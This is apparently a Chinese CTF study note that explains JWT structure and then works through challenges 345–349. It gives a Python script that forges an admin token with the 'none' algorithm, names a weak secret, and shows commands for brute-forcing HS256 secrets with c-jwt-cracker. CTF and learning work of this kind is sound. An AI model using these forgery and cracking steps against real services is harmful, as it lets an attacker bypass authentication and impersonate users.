[toc]

# JWT简介

## JWT的结构

JWT包含了使用.分隔的三部分：

- Header 头部
- Payload 负载
- Signature 签名

其结构看起来是这样的
`xxxxx.yyyyy.zzzzz`

### Header

在header中通常包含了两部分：==token类型和采用的加密算法==。

```java
{
  "alg": "HS256",
  "typ": "JWT"
}  
```

接下来对这部分内容使用 Base64Url 编码组成了JWT结构的第一部分。

### Payload

Token的第二部分是负载，它包含了claim， Claim是一些实体（通常指的用户）的状态和额外的元数据，有三种类型的claim： reserved, public 和 private.

Reserved claims: 这些claim是JWT预先定义的，在JWT中并不会强制使用它们，而是推荐使用，常用的有 iss（签发者）, exp（过期时间戳）, sub（面向的用户）, aud（接收方）, iat（签发时间）。

Public claims：根据需要定义自己的字段，注意应该避免冲突

Private claims：这些是自定义的字段，可以用来在双方之间交换信息

负载使用的例子：

```java
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true
}
```

上述的负载需要经过Base64Url编码后作为JWT结构的第二部分。

### Signature

创建签名需要使用编码后的header和payload以及一个秘钥，==使用header中指定签名算法进行签名==。例如如果希望使用HMAC SHA256算法，那么签名应该使用下列方式创建：

```java
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret)  
```

签名用于验证消息的发送者以及消息是没有经过篡改的。

# 345 无签名

# 346 alg伪造None

> JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么签名会被置空，这样任何token都是有效的。
> 设定该功能的最初目的是为了方便调试。但是，若不在生产环境中关闭该功能，攻击者可以通过将alg字段设置为“None”来伪造他们想要的任何token，接着便可以使用伪造的token冒充任意用户登陆网站。

payload python脚本

```python
import jwt

# payload
token_dict = {
  "iss": "admin",
  "iat": 1609236870,
  "exp": 1609244070,
  "nbf": 1609236870,
  "sub": "admin",
  "jti": "943d0b3237806659d2e205e42b319494"
}

headers = {
  "alg": "none",
  "typ": "JWT"
}
jwt_token = jwt.encode(token_dict,  # payload, 有效载体
                       "",  # 进行加密签名的密钥
                       algorithm="none",  # 指明签名算法方式, 默认也是HS256
                       headers=headers 
                       # json web token 数据结构包含两部分, payload(有效载体), headers(标头)
                       )

print(jwt_token)

```

# 347 弱口令

密匙是：123456

# 348 爆破密匙

[Jwt-爆破](https://github.com/brendan-rius/c-jwt-cracker)

```
git clone https://github.com/brendan-rius/c-jwt-cracker
cd c-jwt-cracker
make

爆破1：
docker run -it --rm  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY2Njc1OTQ3NSwiZXhwIjoxNjY2NzY2Njc1LCJuYmYiOjE2NjY3NTk0NzUsInN1YiI6InVzZXIiLCJqdGkiOiIxM2E5ZDhhYjhkOGQzZTQ0MjVhMDEyMTY0MDNiNzk1NiJ9.cI4k4bSn3d8tnsEapUFL4Q1BXA4TdKrt8vAdDibqyMQ

爆破2
$ > ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE

```

# 349 ras256 非对称加密

